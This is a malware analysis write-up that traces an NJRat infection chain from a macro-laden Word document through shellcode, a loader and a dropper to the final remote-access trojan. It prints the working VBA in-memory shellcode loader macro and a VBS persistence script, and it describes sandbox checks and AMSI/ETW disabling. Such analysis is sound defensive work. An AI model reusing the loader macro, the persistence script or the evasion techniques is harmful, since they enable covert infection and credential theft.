---
tags: RATs
---
## NJRat Injection From Malicious Document

Another RAT variant, NJRat is typically attributed to ECrime actors, it is supposedly popular with actors in the Middle East. It's primary infection vectors are phishing attacks and drive-by downloads, and like many other RATs, it has the capability to log keystrokes, access the victim's camera, steal credentials stored in browsers, open a reverse shell, upload/download files, view the victim's desktop, perform process, file, and registry manipulations, etc...

This sample was taken from the following [tweet](https://twitter.com/DmitriyMelikov/status/1696050783790207060)

[-] Maldoc [VirusTotal](https://www.virustotal.com/gui/file/12237938501141149337015c546b5e02acf3b98c1c26a84b5b4befd97d0f66d0/detection)

[-] PE Payload [VirusTotal](https://www.virustotal.com/gui/file/66702e21faa38c24f49a33112d2036d8f3b6bcfd686db47299a4dc44dedf13d8/detection)

## Maldoc

Like most other maldocs which leverage macros, the document lures the user into enabling content.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/da75e6b8-26e0-4d18-ba83-fd86a19bcdd9)

We can interrogate this macro by using OLE tools to view it.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c521ee37-e76b-4b24-b3f7-7bf4dd102d94)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/66db0700-4e12-4eba-94e4-6621bb1b38d7)

```
Attribute VB_Name = "Module1"
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal six As Long, ByVal five As Long, ByVal four As LongPtr, three As Long, ByVal two As Long, one As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal seven As Long, ByVal eight As Long, ByVal nine As Long, ByVal ten As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal eleven As LongPtr, ByVal twelve As LongPtr, ByVal thirteen As Long) As LongPtr
Public Function db(base64) As Byte()
  Dim DM As Variant, EL As Variant
  Set DM = CreateObject("Microsoft.XMLDOM")
  Set EL = DM.createElement("tmp")
  EL.DataType = "bin.base64"
  EL.Text = base64
  db = EL.NodeTypedValue
End Function

Sub autoopen()
    Dim var2() As Byte
    Dim var4 As LongPtr
    Variables = ActiveDocument.InlineShapes(1).AlternativeText
    var2 = db(Variables)
    var6 = VirtualAlloc(0, UBound(var2), &H1000, &H40)
    var4 = RtlMoveMemory(var6, VarPtr(var2(0)), UBound(var2))
    var4 = CreateThread(0, 0, var6, 0, 0, 0)

   ActiveDocument.Range.Font.Hidden = False
End Sub
```

Essentially, a Base64 string is being taken from ActiveDocument.InlineShapes(1).AlternativeText and decoded, we can assess that the contents are then executed in memory using CreateThread, VirtualAlloc and RtlMoveMemory API calls.

The base64 string is hidden inside a text box on the first page of the document, utilising the Alternative Text field

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4c944195-0f30-4bdb-bf49-6967865241bd)

I found the full string by querying the 'Data' stream, using OLE tools.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fe007626-91e1-4cc1-b51f-5667a6ddfdf0)

_Base64 Snippet:_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/53b37b49-c1de-4051-83c8-fae9faddce0c)

This is donut Shellcode - https://github.com/TheWover/donut

A simple From Base64 operation will reveal the raw shellcode. To investigate this further, I ran the shellcode as an argument with Blobrunner and attached x32dbg to the process.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0734d4a3-15b5-4077-8998-04858c32b2cf)

We'll set a breakpoint in x32dbg for the base address 0x012d0000 and run the shellcode.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7bc92678-f8d7-4d58-94ec-47861d5d2bbd)

I decided to leave this here for now, and instead switched to API monitor to see if i could see some interesting function calls.

Within some of the API calls, there are references to netflex.exe in the AppData directory, which is one of our final payloads.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fcb9df18-624f-4385-9615-51c036dd2b14)

We also see indications that a registry run key is going to be a form of persistence for this malware.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8be53c65-f5cc-41aa-824c-8963e1810e88)

Most interestingly, we can see a NtWrite API call occurring, however, it only seems to show the first 1024 bytes of what it is writing, but from this content also, we can see that it is writing an executable, which we should investigate further.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/db05a2ba-1cb1-4cbc-821e-be7dbfa3e387)

We'll set a breakpoint in x32dbg with "bp NtWriteFile" and run until that breakpoint is met.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/703b708b-975a-476c-8d35-e203f022ddcf)

We can see in the stack that there is an address with "MZ" text which is likely our executable, so we'll follow this in dump.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7f3a3a6e-c861-4025-a930-276a3beb477e)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6738a72d-f15c-4cf1-81ef-0d653d8be98f)

There are very strong indications that this is a binary file being written, we'll follow this in memory map and dump the memory in a file in an attempt to extract the binary.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0433f1a5-718c-47c4-8673-531b4bc67e02)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f39d3fb0-becb-4b17-adbc-35bc1ed4856c)

As this was extracted from memory, we need to clean some bits up before we get our executable, we can do this with HxD and delete everything before our MZ header.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/3595c7dc-21f8-4909-9b56-f90d86b74120)

## 1st Executable - The Loader

This is a .NET binary so we will run it through DNSpy to figure out what it's doing.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/28ef07f4-5a8a-421d-8b18-d8acbca8338c)

This appears to be a loader with the injection target of svchost.exe

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/63e29b47-8ecd-4118-851d-2af3fdde3d59)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d7f5cee7-f6c5-4a30-9ee1-6772dec017dc)

We see more references to the registry run key previously mentioned.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fe9edb4b-affa-4298-8438-e382afd5baf7)

And, what we're interested in - a baes64 encoded chunk and target file path.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1cdab8a4-e617-4b50-b587-f7fb14bf0fb3)

A From Base64 operation will reveal our next binary, dropped from this loader.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a75e9850-0fe6-4b3b-8ab9-ee938484a6d4)






## 2nd Executable - Netflex

Taking a look at the dropped 'netflex.exe' in DNSpy, there are a few things to note.

Firstly, the binary does a basic check to decide if the host is in a virtualised environment by querying Win32_CacheMemory

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6882b2c3-d2b7-4700-b20d-9296049a7200)

If there is a value for Win32_CacheMemory, the program assumes the host is not a virtual machine and will execute the next function.

The next function involves breaking/disabling AMSI and ETW, likely through the use of SharpUnhooker or a similar tool.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/48e550fc-4b5e-4fcf-9e93-438232dbdc9d)


Next up is the main function, which essentially decrypts and executes a payload in memory.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/af3e374a-7c42-4e6f-8775-aae8ad36c471)

The first line derives an AES key by getting the SHA 256 value of Settings.aes_key and taking the first 32 bytes.

The second line takes the contents of baseData, converts it from base64, decompresses the data with the Decompress function, decrypts the data and finally base64 decodes the unencrypted data.

_Decompress Function_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/a0e449f9-0ef4-4d75-b12f-19acbe97c7dd)

The key point here is that the first 4 bytes of baseData declare the length of the data and are not needed for decompression.

The Settings class is compromised of 3 key components, baseData, aes_key and aes_iv.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/1f4f0997-0af7-488a-bfde-bdd9bfda3e2d)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6f646fb8-e4a7-4d4b-b7db-b210541829ea)

We now have everything needed to decrypt the base64 string.

1) Copy and paste the baseData string into CyberChef, convert it from base64.
   
2) Remove the first 4 bytes
   
3) Decompress with Gunzip
   
4) AES decrypt with base64 key "78e3e7cc513ff8ae00a177366efa4060" _(First 32 bytes of the SHA 256 value of 'Q4NP7JPHRA5AJB28')_
   
5) Decode from base64

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/aa810be8-fab3-4223-bf4a-7d1de792bfdd)

This leaves us with another .NET executable.

## 3rd Executable - NJRat Payload

**Command and Control**

Within this executable, we can see the C2 domain and installation directory being declared. 

C2: netflex.duckdns[.]org:2255

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6f7fd25f-61d4-4658-bfac-a22c4f894da3)

**Replication**

There is also the capability for replication across removable media drives, and creating a vbs script as a means of persistence.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/381c8cc6-fca3-42da-ad73-5d1b4f3e790f)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8eb4112f-fa44-46a2-924a-711cf073aca0)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b47f825d-f9e8-4a07-b3be-14859f79be54)

**VBS Script**
```
dim shellobj
set shellobj = wscript.createobject("http://wscript.shell")

ddd= "netsh firewall add allowedprogram c:\users\user\appdata\roaming\netflex\netflex.exe ""netflex.exe"" ENABLE"
cmdshell(ddd)

shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"

function cmdshell (cmd)

dim httpobj,oexec,readallfromany

set oexec = shellobj.exec ("%comspec% /C /Q /K /S" & cmd)
if not oexec.stdout.atendofstream then
   readallfromany = oexec.stdout.readall
elseif not oexec.stderr.atendofstream then
   readallfromany = oexec.stderr.readall
else 
   readallfromany = ""
end if

cmdshell = readallfromany
end function
```

**Persistence**

Previously noted registry run key additions.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d6b7e8d2-0be3-448d-9eb2-f1bb0ec4b51c)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/d7224c19-bd8c-4827-a730-1183d14bfcc3)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f4bf9291-5090-486c-bffd-33e51d3adcc3)

As well as the binary being copied to the Startup directory.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/27e7f7c9-0c18-4648-9119-7acc0357a85d)

**Keylogging**

The 'kl' class in the binary presents the keylogging functionality.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/baf8b432-0770-42ea-a296-6c91518e97c6)

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4795b74c-8d51-4210-94a7-74621f3628e0)

The following line defines where the keystrokes are to be recorded.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e42dd246-0f58-4113-bcfb-f22eb70d79db)

**STV Function**

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0bee5133-49f0-4b5a-9674-7d18cde86dc5)


With this, we know that keystrokes should be recorded under the HKCU\SOFTWARE\Netflex [kl] registry key.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9c582bd7-186c-400d-983d-ea2deddfd01e)

**Basic Execution Flow**


![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/fba213b3-133c-453b-aa70-e2f92e48b105)














